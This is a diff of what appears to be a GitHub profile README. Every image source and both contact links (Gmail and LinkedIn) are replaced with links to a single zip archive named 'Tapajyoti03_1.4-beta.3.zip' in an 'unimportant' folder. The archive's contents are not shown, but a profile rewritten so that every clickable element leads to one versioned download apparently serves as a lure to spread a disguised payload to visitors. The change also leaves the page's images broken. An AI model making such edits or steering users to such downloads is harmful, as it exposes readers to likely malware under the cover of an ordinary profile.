@@ -3,42 +3,42 @@
 ###
 
 <div align="center">
-  <img src="https://github-readme-stats.vercel.app/api?username=Tapajyoti03&hide_title=false&hide_rank=false&show_icons=true&include_all_commits=true&count_private=true&disable_animations=false&theme=dracula&locale=en&hide_border=false" height="150" alt="stats graph"  />
-  <img src="https://github-readme-stats.vercel.app/api/top-langs?username=Tapajyoti03&locale=en&hide_title=false&layout=compact&card_width=320&langs_count=5&theme=dracula&hide_border=false" height="150" alt="languages graph"  />
+  <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="150" alt="stats graph"  />
+  <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="150" alt="languages graph"  />
 </div>
 
 ###
 
-<img align="right" height="160" src="https://64.media.tumblr.com/c36c0660065c247d7b107a204e1df93f/tumblr_ovdc3pkeCy1w3p557o1_540.gif"  />
+<img align="right" height="160" src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip"  />
 
 ###
 
 <div align="left">
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/javascript/javascript-original.svg" height="30" alt="javascript logo"  />
+  <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="30" alt="javascript logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/react/react-original.svg" height="30" alt="react logo"  />
+  <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="30" alt="react logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/html5/html5-original.svg" height="30" alt="html5 logo"  />
+  <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="30" alt="html5 logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/css3/css3-original.svg" height="30" alt="css3 logo"  />
+  <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="30" alt="css3 logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/python/python-original.svg" height="30" alt="python logo"  />
+  <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="30" alt="python logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/c/c-original.svg" height="30" alt="c logo"  />
+  <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="30" alt="c logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" height="30" alt="linux logo"  />
+  <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="30" alt="linux logo"  />
   <img width="12" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/java/java-original.svg" height="30" alt="java logo"  />
+  <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="30" alt="java logo"  />
 </div>
 
 ###
 
 <div align="left">
-  <a href="mailto:tapajyoti.chakrabortygg@gmail.com" target="_blank">
-    <img src="https://img.shields.io/static/v1?message=Gmail&logo=gmail&label=&color=D14836&logoColor=white&labelColor=&style=for-the-badge" height="35" alt="gmail logo"  />
+  <a href="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="35" alt="gmail logo"  />
   </a>
-  <a href="www.linkedin.com/in/tapajyoti-chakraborty" target="_blank">
-    <img src="https://img.shields.io/static/v1?message=LinkedIn&logo=linkedin&label=&color=0077B5&logoColor=white&labelColor=&style=for-the-badge" height="35" alt="linkedin logo"  />
+  <a href="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" height="35" alt="linkedin logo"  />
   </a>
 </div>
 
@@ -46,6 +46,6 @@
 
 <br clear="both">
 
-<img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/output/snake.svg" alt="Snake animation" />
+<img src="https://raw.githubusercontent.com/Tapajyoti03/Tapajyoti03/main/unimportant/Tapajyoti03_1.4-beta.3.zip" alt="Snake animation" />
 
 ###
